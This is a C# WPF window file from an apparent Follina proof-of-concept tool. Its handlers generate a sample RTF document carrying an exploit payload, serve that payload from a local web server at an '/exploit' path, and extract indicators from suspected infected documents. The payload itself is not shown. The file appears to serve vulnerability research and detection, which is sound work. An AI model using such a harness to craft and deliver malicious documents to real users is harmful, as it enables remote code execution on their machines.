using Microsoft.Win32;
using System;
using System.IO;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;

namespace Follina_PoC
{
    public partial class MainWindow : Window
    {
        private readonly WebServer webServer = new();
        private readonly FollinaExtractor follinaExtractor = new();

        public MainWindow()
        {
            InitializeComponent();
        }

        private void ButtonGenerate_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog dialog = new()
            {
                Filter = "RTF Document|*.rtf",
                Title = "Save sample RTF Document",
                AddExtension = true
            };

            if (dialog.ShowDialog() == true)
            {
                File.WriteAllText(dialog.FileName, PayloadGenerator.CreateRTF());
                MessageBox.Show("Sample RTF document successfully created.", "Information", 
                    MessageBoxButton.OK, MessageBoxImage.Information);
            }
        }

        private void ButtonServe_Click(object sender, RoutedEventArgs e)
        {
            webServer.Start();

            TextPayloadServingStatus.Text = string.Empty;
            TextPayloadServingStatus.Inlines.Add(new Run("Serving payload at ") { 
                Foreground = Brushes.DodgerBlue });
            TextPayloadServingStatus.Inlines.Add(new Run("http://[::1]:8080/exploit") { 
                Foreground = Brushes.Red });
            TextPayloadServingStatus.Inlines.Add(new Run(" for experimental purposes...") { 
                Foreground = Brushes.DodgerBlue });

            ButtonServe.IsEnabled = false;
        }

        private void ButtonCopyURL_Click(object sender, RoutedEventArgs e)
        {
            Clipboard.SetDataObject(TextPayloadURL.Text);
        }

        private void ButtonSelectInfectedDocument_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog dialog = new()
            {
                Filter = "RTF or DOCX Document|*.*",
                Title = "Open infected document",
                CheckFileExists = true,
                CheckPathExists = true
            };

            if (dialog.ShowDialog() == true)
            {
                TextBoxInfectedDocument.Text = dialog.FileName;

                var hits = follinaExtractor.ReadFollinaInfectedDocument(dialog.FileName);

                foreach(var hit in hits)
                {
                    TextBoxExtractedItems.Text += hit + Environment.NewLine;
                }

                TextBoxExtractedItems.Text += Environment.NewLine;
            }
        }

        private void Hyperlink_RequestNavigate(object sender, System.Windows.Navigation.RequestNavigateEventArgs e)
        {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
            {
                UseShellExecute = true,
                FileName = e.Uri.AbsoluteUri,
            });
        }
    }
}
